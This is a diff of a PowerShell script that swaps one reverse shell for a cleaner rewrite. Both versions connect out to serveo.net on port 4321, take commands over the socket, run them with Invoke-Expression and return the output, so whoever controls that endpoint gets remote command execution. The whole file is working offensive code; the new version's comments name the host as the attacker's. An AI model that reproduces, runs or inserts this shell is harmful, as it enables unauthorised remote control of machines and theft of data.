@@ -1,21 +1,38 @@
-# Original source: https://gist.github.com/staaldraad/a4e7095db8a84061c0ec
-# Change this line and put your IP
-$socket = new-object System.Net.Sockets.TcpClient('serveo.net', 4321);
-if($socket -eq $null){exit 1}
-$stream = $socket.GetStream();
-$writer = new-object System.IO.StreamWriter($stream);
-$buffer = new-object System.Byte[] 1024;
-$encoding = new-object System.Text.AsciiEncoding;
-do{
-	$writer.Write("> ");
-	$writer.Flush();
-	$read = $null;
-	while($stream.DataAvailable -or ($read = $stream.Read($buffer, 0, 1024)) -eq $null){}	
-	$out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
-	if(!$out.equals("exit")){
-		$out = $out.split(' ')
-	        $res = [string](&$out[0] $out[1..$out.length]);
-		if($res -ne $null){ $writer.WriteLine($res)}
-	}
-}While (!$out.equals("exit"))
-$writer.close();$socket.close();
+# Define the attacker's hostname and port number
+$hostname = "serveo.net"
+$port = 4321
+
+# Create a TCP connection
+$client = New-Object System.Net.Sockets.TcpClient($hostname, $port)
+$stream = $client.GetStream()
+$writer = New-Object System.IO.StreamWriter($stream)
+$reader = New-Object System.IO.StreamReader($stream)
+
+# Send function
+function Send-Data($data) {
+    $writer.WriteLine($data)
+    $writer.Flush()
+}
+
+# Receive function
+function Receive-Data {
+    return $reader.ReadLine()
+}
+
+# Main loop
+while ($true) {
+    try {
+        $command = Receive-Data
+        if ($command -eq 'exit') { break }
+        $output = Invoke-Expression $command 2>&1
+        Send-Data($output)
+    } catch {
+        Send-Data($_.Exception.Message)
+    }
+}
+
+# Close connection
+$writer.Close()
+$reader.Close()
+$stream.Close()
+$client.Close()
